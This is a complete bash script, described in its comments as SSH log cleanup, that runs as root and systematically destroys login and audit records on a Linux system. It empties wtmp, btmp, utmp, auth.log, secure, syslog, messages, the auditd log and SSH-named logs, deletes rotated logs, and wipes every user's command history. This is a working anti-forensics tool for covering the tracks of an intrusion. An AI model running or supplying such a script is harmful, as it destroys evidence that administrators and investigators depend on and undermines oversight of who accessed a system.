#!/bin/bash

# This script cleans up SSH login-related logs on Linux systems.
# It requires root privileges to run.

# Check if the script is run as root
if [ "$EUID" -ne 0 ]; then
  echo "Please run this script as root"
  exit
fi

echo "Starting to clean up SSH login-related logs..."

# Clean successful login records (used by the 'last' command)
echo "Cleaning /var/log/wtmp (used by 'last' command)"
> /var/log/wtmp

# Clean failed login records (used by the 'lastb' command)
echo "Cleaning /var/log/btmp (used by 'lastb' command)"
> /var/log/btmp

# Clean current session records (used by the 'who' command)
echo "Cleaning /var/run/utmp (used by 'who' command)"
> /var/run/utmp

# Clean authentication logs (for Debian/Ubuntu systems)
if [ -f /var/log/auth.log ]; then
  echo "Cleaning /var/log/auth.log (authentication logs for Debian/Ubuntu)"
  > /var/log/auth.log
fi

# Clean authentication logs (for CentOS/RHEL systems)
if [ -f /var/log/secure ]; then
  echo "Cleaning /var/log/secure (authentication logs for CentOS/RHEL)"
  > /var/log/secure
fi

# Clean general system logs
if [ -f /var/log/messages ]; then
  echo "Cleaning /var/log/messages (general system logs)"
  > /var/log/messages
fi

# Clean syslog (mainly used in Debian/Ubuntu)
if [ -f /var/log/syslog ]; then
  echo "Cleaning /var/log/syslog"
  > /var/log/syslog
fi

# Clean root user's command history
if [ -f /root/.bash_history ]; then
  echo "Cleaning /root/.bash_history (root user command history)"
  > /root/.bash_history
fi

# Clean command history for all users
for user in $(cut -f1 -d: /etc/passwd); do
  history_file="/home/$user/.bash_history"
  if [ -f "$history_file" ]; then
    echo "Cleaning $history_file (command history for user $user)"
    > "$history_file"
  fi
done

# Clean compressed and rotated log files (.gz, .1, .old, etc.)
echo "Cleaning compressed and rotated log files (.gz, .1, .old, etc.)"
find /var/log -type f \( -name "*.gz" -o -name "*.1" -o -name "*.old" \) -exec rm -f {} \;

# Clean audit logs (used by auditd for detailed login and permission logs)
if [ -f /var/log/audit/audit.log ]; then
  echo "Cleaning /var/log/audit/audit.log (auditd logs)"
  > /var/log/audit/audit.log
fi

# Clean custom SSH logs, if present
if [ -f /var/log/sshd.log ]; then
  echo "Cleaning /var/log/sshd.log (custom SSH logs)"
  > /var/log/sshd.log
fi

# Find and clean other SSH-related logs
echo "Finding and cleaning other SSH-related logs"
ssh_logs=$(find /var/log -type f -name "*ssh*")
for log in $ssh_logs; do
  echo "Cleaning $log"
  > "$log"
done

# Restart the rsyslog service to refresh the logging system
echo "Restarting rsyslog service to refresh the logging system..."
systemctl restart rsyslog

echo "SSH login logs cleanup completed."

exit 0

